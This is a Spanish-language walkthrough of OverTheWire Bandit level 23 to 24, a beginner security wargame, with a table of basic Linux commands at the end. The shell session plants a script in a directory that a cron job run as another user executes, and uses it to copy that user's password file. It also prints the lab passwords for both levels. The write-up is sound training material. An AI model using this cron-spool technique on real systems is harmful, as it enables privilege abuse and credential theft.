# Bandit Level 23 -> Level 24



## objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
**ssh bandit23@bandit.labs.overthewire.org -p 2220**
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G


## solucion
```bash()
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$  cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/kd
bandit23@bandit:~$  cd /tmp/kd
bandit23@bandit:/tmp/kd$  echo "cat /etc/bandit_pass/bandit24 >
/tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh 
cat /etc/bandit_pass/bandit24 >
/tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$  touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls -la
total 116
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 24 23:01 .
drwxrwx-wt 2981 root     root     106496 Feb 28 18:26 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 18:25 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 18:24 script.sh
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 116
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 24 23:01 .
drwxrwx-wt 2981 root     root     106496 Feb 28 18:26 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 18:25 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 18:24 script.sh
bandit23@bandit:/tmp/kd$ date
Tue Feb 28 06:26:35 PM UTC 2023
bandit23@bandit:/tmp/kd$ ls -la
total 116
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 24 23:01 .
drwxrwx-wt 2981 root     root     106496 Feb 28 18:26 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 18:25 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 18:24 script.sh
bandit23@bandit:/tmp/kd$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/kd$ exit
```

## Notas adicionales
| comando | descripcion
| cat | demuestra el contenido de un archivo |
| ls | demeuestra la lista de contenidos del directorio|
|ls -la | usamos un formato de lista mas detallado que no ignora entradas empezando con '.' |
|mkdir | permite al usuario crear directorios (también denominados carpetas en algunos sistemas operativos). |
| cd | se usa para cambiar el directorio de trabajo actual (es decir, en el que está trabajando el usuario actual). El "cd" significa "cambiar de directorio". |
| chmod | El comando chmod de Linux se usa para cambiar los permisos de acceso de archivos y directorios. Significa "Change mode" o modo de cambio. No puede cambiar el permiso de enlaces simbólicos. Incluso, ignora los enlaces simbólicos que se encuentran en el recorrido recursivo del directorio. |
| touch | El comando touch actualiza los tiempos de acceso y modificación de cada archivo especificado por el parámetro Archivo de cada directorio especificado por el parámetro Directorio. |


## Referencias
[[https://www.geeksforgeeks.org/practical-applications-ls-command-linux/|Referencia del comando ls]]
[[https://www.geeksforgeeks.org/cat-command-in-linux-with-examples/|Referencia del comando cat]]
[[https://www.geeksforgeeks.org/mkdir-command-in-linux-with-examples/|Link para el comando Mkdir]]
[[https://www.javatpoint.com/linux-cd#:~:text=Linux%20cd%20command%20is%20used,commands%20in%20the%20Linux%20terminal.|Link para comando cd]]
[[https://www.javatpoint.com/linux-chmod-command#:~:text=Linux%20chmod%20command%20is%20used,come%20across%20recursive%20directory%20traversal.|Link del comando chmod]]
[[https://www.ibm.com/docs/pl/aix/7.1?topic=t-touch-command|Link para el comando touch]]
[[https://overthewire.org/wargames/bandit/bandit24.html|Link del nivel 23 al 24]]




